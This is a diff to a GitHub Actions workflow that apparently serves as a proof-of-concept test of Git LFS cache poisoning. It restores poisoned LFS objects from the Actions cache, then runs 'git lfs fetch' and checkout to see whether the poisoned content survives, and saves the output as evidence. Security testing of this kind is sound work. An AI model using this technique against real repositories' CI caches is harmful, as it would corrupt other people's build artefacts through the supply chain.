@@ -107,28 +107,30 @@ jobs:
           path: .git/lfs
           key: autogen-lfs-poison-${{ github.run_id }}-poison
 
-      - name: Run git lfs smudge (consume poisoned cache directly)
+      - name: Run git lfs fetch + checkout (consume poisoned cache)
         continue-on-error: true
         run: |
           mkdir -p evidence
           git lfs install --local 2>&1 | tee evidence/lfs-install.txt
-          # The key attack: poisoned .git/lfs/objects are already restored by cache
-          # git lfs checkout will use them if they exist locally
-          # DO NOT run git lfs fetch - it would re-download from server
+          echo "lfs_install_rc=$?" >> evidence/lfs-install-rc.txt
+          echo ""
+          echo "=== .git/lfs/objects BEFORE fetch (from cache restore) ==="
+          OBJ_COUNT=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
+          echo "Object count: $OBJ_COUNT"
+          find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-before.txt
+          echo ""
+          echo "=== Running git lfs fetch (key: git-lfs skips download for existing objects via size match) ==="
+          git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt || true
+          echo "lfs_fetch_rc=$?" >> evidence/lfs-fetch-rc.txt
+          echo ""
+          echo "=== .git/lfs/objects AFTER fetch ==="
+          OBJ_COUNT2=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
+          echo "Object count: $OBJ_COUNT2"
+          find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-after-fetch.txt
+          echo ""
+          echo "=== Running git lfs checkout ==="
           git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt || true
           echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
-          echo ""
-          echo "=== Checking which files are LFS pointers vs real content ==="
-          for img in $(find . -type f \( -name '*.png' -o -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -10); do
-            SIZE=$(stat -c%s "$img" 2>/dev/null)
-            SHA=$(sha256sum "$img" 2>/dev/null | awk '{print $1}')
-            HEAD=$(head -c 20 "$img" 2>/dev/null | xxd -p)
-            echo "$img size=$SIZE sha256=$SHA head=$HEAD"
-            echo "$img size=$SIZE sha256=$SHA head=$HEAD" >> evidence/image-check.txt
-          done
-          echo ""
-          echo "=== LFS objects in .git/lfs/objects ==="
-          find .git/lfs/objects -type f 2>/dev/null | head -20
 
       - name: V2 - Integrity guarantee check on autogen images
         run: |
